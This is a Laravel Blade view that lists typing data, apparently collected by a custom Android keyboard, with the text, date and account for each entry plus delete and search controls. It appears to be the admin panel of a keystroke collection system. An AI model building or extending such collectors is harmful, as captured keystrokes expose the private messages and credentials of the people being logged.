@extends('data.datalayout')

@section('title')
Collected keyboard info
@endsection

@section('description')
Typing info collected from a custom made Android keyboard.
@endsection

@section('headers')
<th>#</th>
<th>Text</th>
<th>Date</th>
<th>Account</th>
@endsection

@section('info') 
@foreach($data as $l)
<tr>
        <th>{{$l->id}} </th>
        <th>{{$l->text}} </th>
        <th>{{$l->date}} </th>
        <th>{{$l->collectoruser->account}} </th>
        <th>
        {!!Form::open(['action' => ['KeyboardController@destroy', $l->id], 'method' => 'POST', 'class' => 'pull-right'])!!}
        {{Form::hidden('_method', 'DELETE')}}
        {{Form::submit('Delete', ['class' => 'btn btn-warning'])}}
        {!!Form::close()!!}
        </th>
</tr> 
@endforeach

@endsection

@section('name')
KeyboardController
@endsection

@section('search')
@include('data.search',['url'=>'collector/keyboard','link'=>'collector/keyboard'])
@endsection